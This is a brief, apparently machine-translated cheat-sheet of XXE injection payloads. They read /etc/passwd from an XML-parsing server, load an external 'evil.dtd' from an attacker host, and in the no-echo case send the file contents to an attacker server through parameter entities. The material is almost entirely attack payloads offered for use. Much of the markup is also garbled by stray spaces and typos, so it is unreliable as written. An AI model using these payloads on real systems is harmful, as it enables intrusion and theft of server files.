Combining external entity declaration (entity name SYSTEM "uri / url") and parameter entity (% entity name SYSTEM "uri-external dtd") have two ways to perform injection attacks    

if ECHO situation:    

A.    
```
<! DOCTYPE foo [<! ELEMENT foo ANY> 
<! ENTITY% xxe SYSTEM "file: /// etc / passwd"> ]>
 <foo> & xxe; </ foo>
```   

B.   
```
<! DOCTYPE foo [<! ELEMENT foo ANY> 
<! ENTITY% xxe SYSTEM "http: //xxx/evil.dtd">
% xxe;]>
<foo> & evil; </ foo>
```    
contents of external evil.dtd     
`<!ENTITY %evil SYSTEM "file:///ect/passwd">`   

C. if NO ECHO situation:   
(You can use an external data channel to extract the data, first use file: // or php: // filter to get the content of the target file, and then send the content as an http request to the server that receives the data (attack server))     
```
<! DOCTYPE updateProfile [ 
<! ENTITY% file SYSTEM "file: /// etc / passwd"> 
<! ENTITY% dtd SYSTEM "http: //xxx/evil.dtd">
% dtd;
% send;
]>
```    
The content of evil.dtd, the internal `%` number should be physically encoded `&#x25;`   
```
<!ENTITY % all
"<!ENTITY &#x25 send SYSTEM 'http://xxx.xxx.xxx.xxx/?data=%file;'>"
>
%all;
```

